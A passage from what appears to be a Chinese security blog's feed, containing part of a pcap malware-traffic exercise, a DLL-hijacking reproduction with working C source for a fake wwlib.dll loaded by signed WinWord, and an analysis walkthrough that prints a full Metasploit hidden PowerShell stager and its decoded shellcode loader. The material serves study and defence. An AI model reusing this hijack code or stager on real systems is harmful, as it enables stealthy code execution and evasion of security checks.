ATURAL,CN=Computers,DC=mrnatural,DC=info&quot;</code></pre><p><img src="https://s3.ax1x.com/2020/12/15/ruOZrQ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOebj.png" alt=""></p><p>后面对着每个IP都检查了一下，发现可疑也就http流量的那三个。其他都无异样，后面去微步社区查了一下找到了以下信息<br><img src="https://s3.ax1x.com/2020/12/15/ruOQP0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruO12T.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruOlGV.png" alt=""></p><p>至此也没什么好弄的，，，可能还有一些别的没发现吧。太菜了<br>以下微步社区和分析的链接：<br><a href="https://x.threatbook.cn/nodev4/ip/72.21.81.240" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/72.21.81.240</a><br><a href="https://x.threatbook.cn/nodev4/ip/67.24.185.254" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/67.24.185.254</a><br><a href="https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)&lt;br&gt;翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄&lt;br&gt;&lt;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>白加黑wwlib.dll复现</title>
    <link href="http://422926799.github.io/posts/7b49de5f.html"/>
    <id>http://422926799.github.io/posts/7b49de5f.html</id>
    <published>2020-12-04T06:39:36.000Z</published>
    <updated>2020-12-04T06:50:39.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今日看到某分析文章，利用word的wwlib.dll实现白加黑。虽然这个操作很早就有了，翻了一下笔记发现没有测过，实验一波并做测试</p><h2 id="白加黑概念"><a href="#白加黑概念" class="headerlink" title="白加黑概念"></a>白加黑概念</h2><p>白exe，黑dll<br>所谓白exe指拥有数字签名的exe，数字签名也分三六九等。大厂的签名一般都很不错，WinWord.exe的数字签名即为微软的数字签名<br><img src="https://s3.ax1x.com/2020/12/04/DbiDEV.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>将WinWord.exe拖入IDA分析，追踪LoadLibraryW函数可以看到有几个调用<br><img src="https://s3.ax1x.com/2020/12/04/DbiggJ.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/DbifD1.md.png" alt=""></p><p>个人测试<br>（由于IDA不在虚拟机，直接把winword拖出到物理机看，和文章所测试的并不相同）<br><img src="https://s3.ax1x.com/2020/12/04/Dbio4O.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/Dbi7CD.png" alt=""></p><p>IDA不行的话<br>作者给出的其他的方法：<br>如果无法使用IDA静态分析我们可以使用API监控软件来观察，如火绒剑或API Monitor，当然也可以使用OD下断点来分析。（这里和使用IDA没什么区别，不同的PE文件用不同的方式来达到最好的效果）</p><p>OD断点LolibraryW，可以发现加载的wwlib.dll和其调用wwlib.dll内的函数<br><img src="https://s3.ax1x.com/2020/12/04/Dbijbt.png" alt=""></p><p>目前所知道的内容：</p><pre><code>* 加载的wwlib.dll    * 调用Fmain函数    * 调用wdCommandDispatch函数    * 调用wdGetApplicationObject函数</code></pre><p>利用手段：</p><pre><code>* vs自己写dll，实现调用的三个函数* msf直接生成个dll，在dllmain函数直接实现劫持</code></pre><p>wwlib.dll导出函数<br><img src="https://s3.ax1x.com/2020/12/04/DbFivj.png" alt=""></p><p>其实wwlib.dll可以拖入到IDA分析导出函数，然后在编写。由于这里测试的时候出现了点问题，直接拿文章给出的图按着构造即可</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        exit(0);        return 1;}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>x86生成dll，替换掉原来的wwlib.dll即可看到定义的弹框<br><img src="https://s3.ax1x.com/2020/12/04/DbFM24.png" alt=""></p><p>注意事项:<br>写好对应要劫持的dll函数生成后，注意原来dll的位数。不要原本是x86生成个x64，那铁定跑不了。（tm我在这踩了一个小时的坑，xswzj）</p><p>dllmain函数处劫持（在DllMain中DLL_PROCESS_ATTACH选项下（每次加载DLL首先执行的地方））<br><img src="https://s3.ax1x.com/2020/12/04/DbF8q1.png" alt=""></p><p>实现劫持dll并使得winword正常运行，像上面粗暴的方法去定义dll函数。然后等着exe去执行，返回预期不一致的话导致exe无法正常运行退出。使得恢复exe正常运行最简单的方法就是把原来的dll改名，然后在调用处调用dll的函数（仅限于可以看见调用的导出函数）</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();typedef int(*run)(int a,int b,int c,int d);int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        HMODULE v1 = LoadLibraryA(&quot;WWLIBS.DLL&quot;);        run v2 = (run)GetProcAddress(v1,&quot;FMain&quot;);        return v2(a,b,c,d);}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2020/12/04/DbFrqI.gif" alt=""></p><p>文章中重点:<br>如何发现存在DLL劫持漏洞的新可执行文件<br>其实网络世界中存在大把存在DLL劫持漏洞的应用程序，那么我们该如何选择对应的可执行文件呢？<br>1.独立的EXE文件来调用恶意DLL。（独立EXE必须为合法的白文件）<br>2.独立的EXE文件必须具有数字签名，并且该数字证书不会在短期内过期。<br>3.数字签名最好包括微软的数字签名。<br>4.独立的EXE必须使用Load来加载DLL且没有验证DLL。</p><p>防御与总结<br>首先对该类型的攻击有以下几个比较好的方法去防御。<br>1．可以检查网络连接异常的进程：首先我们可以将正常的网络通信进程链进行记录，当发现该进程的网络活动与记录的进程链不符时，则可能受到了DLL劫持攻击。<br>2．在加载DLL时，先将文件读入内存中验证其数字签名或是哈希值，发现不匹配则不加载该DLL。<br>3．当然Microsoft提供了一些关于DLL安全性和针对DLL劫持漏洞的相关文档。</p><p>参考链接:<a href="https://www.freebuf.com/articles/system/227824.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/227824.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;今日看到某分析文章，利用word的wwlib.dll实现白加黑。虽然这个操作很早就有了，翻了一下笔记发现没有测过，实验一波并做测试&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DerbyCon工具使用</title>
    <link href="http://422926799.github.io/posts/9b2537f1.html"/>
    <id>http://422926799.github.io/posts/9b2537f1.html</id>
    <published>2020-11-11T08:45:36.000Z</published>
    <updated>2020-11-11T09:24:03.343Z</updated>
    
    <content type="html"><![CDATA[<p>这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等<br>仓库地址：<a href="https://github.com/PCsXcetra/DerbyCon-2019Files" target="_blank" rel="noopener">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p><h2 id="分析示例"><a href="#分析示例" class="headerlink" title="分析示例"></a>分析示例</h2><p>msf直接生成两个作为样本bin和psh-cmd</p><p>Extract-IP-From-Meterpreter-ShellCode.exe - 分析shellcode获得其中里面的ip和port。（只适用于msf的shellcode，可以把exe/bin文件的hex提取出来然后去执行）<br><img src="https://s1.ax1x.com/2020/11/11/BjcKf0.png" alt="shellcode raw"></p><p><img src="https://s1.ax1x.com/2020/11/11/Bjc3XF.png" alt="获取ip and port"></p><p>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br>psh-cmd</p><pre><code>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAEYAaAAvAHEAMQA4AEMAQQA3AFYAVwBiAFcAKwBiAFMAQgBEACsAbgBFAGoAOQBEADYAaQB5AFoARgBBAGMAZwAxAE0AMwA1ADQAdABVADYAUQBCAEQAagBHAHQAUwBFADIAegBzADIARwBlAGQAQwBDAHkAdwA5AGIATAA0AFkASQBsAE4AZQB2ADMAdgBOADIAdgBqAE4ARgBYAFQAcQBqADMAcABFAEIATAA3AE0AaQAvAFAAUABEAE8ANwBRADEAVABTAGcATwBHAE0AQwBxAHcAbgBmAEgAcAAxAGUAagBMADIAYwB6ADgAVgB4AEUAYgBzAFAAYgBhAEUAQgBqAEkAZAA2AGUAUQBFAGwAaAB0AFYAZgBoAE0ASwA3AHcAUgB4AHEAVwA0ADIALwBTAHoAMQBNAFYAMQBkAFgAZQBsAGwAbgBpAFAASwBEAHYAUAAyAE4AVwBKAHEAVQBhAEQAMABuAG0AQgBVAGkASgBMAHcAagB6AEIATABVAEkANwBPAFAAOQB4AC8AUgBBAEUAVABQAGcAbQBOAHYAOQByAFgASgBMAHYAMwBTAFMAMQBXADYAWAA2AFEASQBPAEYAYwBwAFMASABmAEcAMgBXAEIAegA2AEcAMAAzAFEAMwBCAFQARwB6ACsAKwBXAGQAVABXAHAANQAzAFYAbQAzAGoANwA5AEkAbgBoAGQAaAAwAHEANABLAGgAdABCADAAUwAwAHAAUwBFAHoAeABKADMATwBLAGsAMgBTAEcAegBhAE8ATQBpAHoASQBvAHQAWQBlADQAYgBwAG0ANAB2ADIAbABCAFoAKwBoAEcANwBBADIAZwBPAHkARQBVAHUAeQBzAEcAaABLAEUAQQBXADgATwBXAEoAbABUAG8AVgA5AFAATgB6AEEAWQBWAHQAcwB3AG4AQwBjAFoANABFAGEAaABqAGsAcQBpAG0AWgBMAFcASABMAFQAeQA5AFgAcQBEADMARgBaACsANwAwAHQASwBjAE0AcABhAGwAdQBVAG8AVAB6AGIAdQBDAGgALwB3AEEARQBxADIAZwBPAGYAaABnAFQAZABvAG0AZwBGAFcAaQA3AEwATQBZADEAWABrAGcAUgBpAEQAOQBrAGEAaQBRADEAYQBFAHQASQBTAGYAcwBXAE0AZQBJAE8AMgBSADkAWgArAFYAawBsADgAcgBnAFIAUwBZADUAWgBMAEwAYwBqAGoAQwAzAEgAYQBXAFYAZwBTAGQATgBCAHMAdgBnAEMAVQA1ADEANgBDAHAAOAA0AC8ARQBQAGYANQAxAGUAbQByADAAKwBoAFkASwBWAHYAcgBlAGEAWABBADYARwBTADUASAB5AE8AQQBKAG8ANgB6AEEAdQArAGwAMwBnAGwASwBTADcARABCAGkAYwArAHkAdgBJAEoAcABZADUASwBYAFMARgBvADkARQBTAHMAMAA0AHAAMwBmACsAcgA1ADYANQB5AGcATABrAHEAbgBuAFgAVgA3AEEAMgB0AEwATABjAEwAZwBDAG4AVABxAGIAagBSAFEAaAB6AGUAVQBiADMAeQAvAEwAUABvAG8AdwBSAGYAMgBLACsAaQBrAE8AagBwAFUAbgB2AHMAUQB4AGkAZwBqAGEAaAA5AGcAKwBpAHQAMABBAEwATABGAFoAYgA2AEMAdwBqAHcAaQBLAGYAYwBaAFoANAA2AG4AKwBSAHMAMQBJAE0AWAB2AFMAMQBVAHAATQBRAHAAUwByAEEAZQBTAHAAQQBGAFMAUQBRAHUAbAByAE0ASQBkAEUAaQBFADIATAAyAGkAZwBGAGsAZwA1AHoAcQBMADEARwBCAFAAVwBPAGoAdABKADEAagBWAGQASAA3ADMAdwBPAFEAawAyAGQAKwBFAFgAUgBFAHMAWQBsAEgATABpAGcASgBiAGoASQBKAHkAaABzAEMAUwBvAHQAYwBMADIAbABsAGkAegBiAEQANQB0AGYANABOAG8AbABZAFQAagB3AEMAMwBZADAAdAA1AEsAZQBpAEsAdwBkADYAaABrAHQAVwBGADQARwBrAEQAZwBJAGYAdQBKAHUAVQBJAEIAOQB3AHIAbABvAEMAUQBNAGMASQBxADEAeQBjAFgAeAAwADMASAB5AFIAQwBkADAAbgBCAE0ANABCAFcASABxAEEAVABNAEEASwBaADgAQgBsAHYAQgB4AHkAdwBNAGgAVABMADcAVgBkAHgASwB4ADAAUQAxAEEASwBJAHYAdQBUAGIAeABJAC8AaABuAE4AZQBGAC8AdQArAGYAUAB3AFkAaABjADEAdgBFAEIANgByACsAVgBDADYAbgBJAHcAagBDADgALwB3AFEAWQBaAGQAawByAEcAVwA0AE8ARwBjAHcAUQAzAEMAaQBkADAAWAAwAG4ALwB5AC8AKwB6AHUATwBDAEQAUgBjADEAUQBuAFEAegB3AGUAawBhAFYAVwBNAFYANwBhAEQAWgByAHkAbQBxAHgAcAAyAFoATwBRAE0AeQBEAEEAegBMAE4AVQA4AHcAdAAwADIAVAAxAGMARQArAEoAcgAyAGMARAA5AHQAKwBOACsAOQBxAGoAQwBZADUAaQAzAGoAcQBlADUAVQAyADkAaAAyAGUARwBRAHUAQgBaAHoANwB3AHcAOABtAGkAYQBKAGgAVAB0AFcARABQAE4AcQBhAHMAUgBqAHAAbQB6AGUAVAB5AGEARABvAGQAcwBmAHEASABsAC8AbAAwAFMAcQBWAFYAagBHAFEASwB1AGMAagBxAFkARwBBAC8AeQBiAE4AOQBTAG0AVQA5AEQARAArAHMAagA1AHUATABQAFUAVQBFAHYAagBlAFgAeQBuAGIANgAxAHgATQByAGYAQQBrAFQANgBLAHIAUgBpACsAbQBwAFUARQBtAHIASgBRAFkAawAwAHgAOQBaAEcAcgBKAFEAWgBXADEATgBoADEAQgBrADYAMwBzADcARABrAEgAdABIAHcAbwAyAHUANQA2AG0ARAAyADUATwAvAEoAagA5AEgAdABEAHUAYQA3AGkAWABwAGoARAA5AFgARQAvAEIAQwBhAG4AUQB0AHoAcgA3AC8AbQArAG8AdgAxADkAYQBoAHYANwBPAGMAQgBuAHoAdAAzAGgAWQBFAE4AOABHAE8AWQBkADQANgBYAG8ASgBtADMAMABXAGEARwB1AFgAQwA4AGoAUgBXAGYAYgBXAFAASABHADgAbABkAE0AOQBGAGcAMwBjAEsANwAwAGMAYQBWADQAZQBsADAAaABnADgAMABmAEwAUgBKADcAOQBFAEcAdQBJADYAMwBHAEcASwAwAHMARwBKAFUAeABhAHEAagBxAHUANABkAEoAZQA3ADkAVgBsAGMAMQBNADkAaQArAFQAMwBiAHIAcQBUAG0ARgB0AGYAWABFAG8AagB2AG4AZgBtAE8ASAAxAGQAMQBBAC8AdAAyAHoATQBkAHAAawBxAG0ATwBvAHEAawBuAGcAVABLAGEAcQB2ACsAMwBMAG4AVgBuADIAMwB2AEgAZQBPAGwATgBEADIAVgBWAFQAWgBiAGMAMQBQAHMAcABiAEEAdwArADMANgAvAG8ANwB2AGIANgA4AGoATwBXAG8ATwA1AFkAOQAxADYASQBEAFAAOQBFAEEAYgB6AFgAcwByAHYASAB3AEQAUABaAFMAMwAxAFAAdQBJAHQAbgBqAC8ATwBsAHIASwBqAC8AUwBPAGIAawBjADIAbgB0AE8ASQBSADQASABkAEQARABuAHoASQA5AHYAUQBlACsAZwBvAHoASgBxAHoAVwBYAFoAaQArAFYAWQBqAFkAaABuAHgAVAAwAG4AbgBtAGYAMAB3AGwAKwBEADcAVgBtAHMAQQBrAEsASQBFAFgASQBkAEQAUwAwADcAQQBLAHcARQByADYAZABuAGMANwBrAHoAQgBUAHgASwBPAHQAdwBwAEgARwBzADYANwBJAEcAOQBpAC8AVQBMAE4AdAAwAEUAdQBBADAAWAB2AHEAcAB4AEgATgByAHMATwBsAE4AbgA2ACsAdABMAHYAZQBxAE4AYgBZAGoARAA2ADQAQgBOADYAcABXAFQAMgBRAEIAcwBBAHUAWgB5ADMAZQBNADAAUQAzADcANwByAGsANgB2AFgAVwB0ACsARQBkADcAZgBhAHYASgBaAGUATwBmAEgAMgBzAEkATgBJAHIAMAAzAG0AbQBIAHYAUQBmAFoAZQA4AHkATQBBAFoANgBCAFIAUABHADYANwBuAFcAZgBGAC8AYgAzAEcAWgBQAHQANQBrAGYAZwBFAGkAaAA0ADYAegB2AEcAcQBNAGIAUABjAHIATAB2AEkATwBNAE4AYwBRAHgAVABoAHYAMgBPAE4AYwBvAG8ASQA5AEcAMwBvADcATQBmAEQAcQBoAEsAUwBCAGIAeQBEAFEAYgBlAEIAMwBuAG4AbwBhAEwAegBCAFQAbQBIADQANQB1AEwARgBrAFMAUQA4AEMAVQBwAGYAKwB0AHAAeAA2AGUAcABxAEEAUQBqAGgANwBOAE8AMABQAFUASQAwAFoAawBsAEwAMgBiADEAUgBGAEcAaABUAHkAcQA2AHIAUQBJAEEALwBIADUATwBlAGIAUwBwAG8AbQBHAG0ATABOADcAawBEAEoAdwBmAEQAWgBHADkAWQA0AHAAZABCAEkANQByAE4AdwAvACsAVABxAGYAbwBDAFMAdQBBAFQALwBwAGkAcABMADIAcwAvADIAUAAwAHAAOQBwAFIAVwBIAGUAMAAzADYAMQA4AHYALwBCAEsAYgB2AHgAagAzAHoATQBjAE0ANQBGAHkANABRAEEAawA2AHQAUABDAFgAdwBxADkAcgA0AHQAawBQAEQAawA4AEkANQBEAHkAcQBIAC8ANgBIACsAcQBGAGsANQB6AGYAdwAzAC8AUABxADkARgAvAEMAWABSAFQAbwBDAFEAcwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA</code></pre><p>base64解码一波<br>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br><img src="https://s1.ax1x.com/2020/11/11/BjgiNR.png" alt=""></p><p>PS-Light-Format.exe - powershell代码美化<br><img src="https://s1.ax1x.com/2020/11/11/BjgTxK.png" alt=""></p><p>美化后的psh</p><pre><code class="powershell">if([IntPtr]::Size -eq 4){$b=$env:windir+&#39;\sysnative\WindowsPowerShell\v1.0\powershell.exe&#39;}else{$b=&#39;powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAFh/q18CA7VWbW+bSBD+nEj9D6iyZFAcg1M354tU6QBDjGtSE2zs2GedCCyw9bL4YIlNev3vN2vjNFXTqj3pEBL7Mi/PPDO7Q1TSgOGMCqwnfHp1ejL2cz8VxEbsPbaEBjId6eQElhtVfhMK7wRxqW42/Sz1MV1dXellniPKDvP2NWJqUaD0nmBUiJLwjzBLUI7OP9x/RAETPgmNv9rXJLv3SS1W6X6QIOFcpSHfG2WBz6G03Q3BTGz++WdTWp53Vm3j79Inhdh0q4KhtB0S0pSEzxJ3OKk2SGzaOMizIotYe4bpm4v2lBZ+hG7A2gOyEUuysGhKEAW8OWJlToV9PNzAYVtswnCcZ4EahjkqimZLWHLTy9XqD3FZ+70tKcMpaluUoTzbuCh/wAEq2gOfhgTdomgFWi7LMY1XkgRiD9kaiQ1aEtISfsWMeIO2R9Z+Vkl8rgRSY5ZLLcjjC3HaWVgSdNBsvgCU516Cp84/EPf51emr0+hYKVvreaXA6GS5HyOAJo6zAu+l3glKS7DBic+yvIJpY5KXSFo9ESs04p3f+r565ygLkqnnXV7A2tLLcLgCnTqbjRQhzeUb3y/LPoowRf2K+ikOjpUnvsQxigjah9g+it0ALLFZb6CwjwiKfcZZ46n+Rs1IMXvS1UpMQpSrAeSpAFSQQulrMIdEiE2L2igFkg5zqL1GBPWOjtJ1jVdH73wOQk2d+EXREsYlHLigJbjIJyhsCSotcL2llizbD5tf4NolYTjwC3Y0t5KeiKwd6hktWF4GkDgIfuJuUIB9wrloCQMcIq1ycXx03HyRCd0nBM4BWHqATMAKZ8BlvBxywMhTL7VdxKx0Q1AKIvuTbxI/hnNeF/u+fPwYhc1vEB6r+VC6nIwjC8/wQYZdkrGW4OGcwQ3Cid0X0n/y/+zuOCDRc1QnQzwekaVWMV7aDZrymqxp2ZOQMyDAzLNU8wt02T1cE+Jr2cD9t+N+9qjCY5i3jqe5U29h2eGQuBZz7ww8miaJhTtWDPNqasRjpmzeTyaDodsfqHl/l0SqVVjGQKucjqYGA/ybN9SmU9DD+sj5uLPUUEvjeXynb61xMrfAkT6KrRi+mpUEmrJQYk0x9ZGrJQZW1Nh1Bk63s7DkHtHwo2u56mD25O/Jj9HtDua7iXpjD9XE/BCanQtzr7/m+ov19ahv7OcBnzt3hYEN8GOYd46XoJm30WaGuXC8jRWfbWPHG8ldM9Fg3cK70caV4el0hg80fLRJ79EGuI63GGK0sGJUxaqjqu4dJe79Vlc1M9i+T3brqTmFtfXEojvnfmOH1d1A/t2zMdpkqmOoqkngTKaqv+3LnVn23vHeOlND2VVTZbc1PspbAw+36/o7vb68jOWoO5Y916IDP9EAbzXsrvHwDPZS31PuItnj/OlrKj/SObkc2ntOIR4HdDDnzI9vQe+gozJqzWXZi+VYjYhnxT0nnmf0wl+D7VmsAkKIEXIdDS07AKwEr6dnc7kzBTxKOtwpHGs67IG9i/ULNt0EuA0XvqpxHNrsOlNn6+tLveqNbYjD64BN6pWT2QBsAuZy3eM0Q377rk6vXWt+Ed7favJZeOfH2sINIr03mmHvQfZe8yMAZ6BRPG67nWfF/b3GZPt5kfgEih46zvGqMbPcrLvIOMNcQxThv2ONcooI9G3o7MfDqhKSBbyDQbeB3nnoaLzBTmH45uLFkSQ8CUpf+tpx6epqAQjh7NO0PUI0ZklL2b1RFGhTyq6rQIA/H5OebSpomGmLN7kDJwfDZG9Y4pdBI5rNw/+TqfoCSuAT/pipL2s/2P0p9pRWHe03618v/BKbvxj3zMcM5Fy4QAk6tPCXwq9r4tkPDk8I5DyqH/6H+qFk5zfw3/Pq9F/CXRToCQsAAA==&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);</code></pre><p>$s.Arguments解析得到code<br><img src="https://s1.ax1x.com/2020/11/11/BjRqNd.png" alt=""></p><pre><code class="powershell">function t8 {    Param ($gVz, $eFQ)            $yrNd = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)    return $yrNd.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yrNd.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($gVz)))), $eFQ))}function wI {    Param (        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $gxa,        [Parameter(Position = 1)] [Type] $mVV62 = [Void]    )    $meeBS = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])    $meeBS.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    $meeBS.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $mVV62, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    return $meeBS.CreateType()}[Byte[]]$nm = 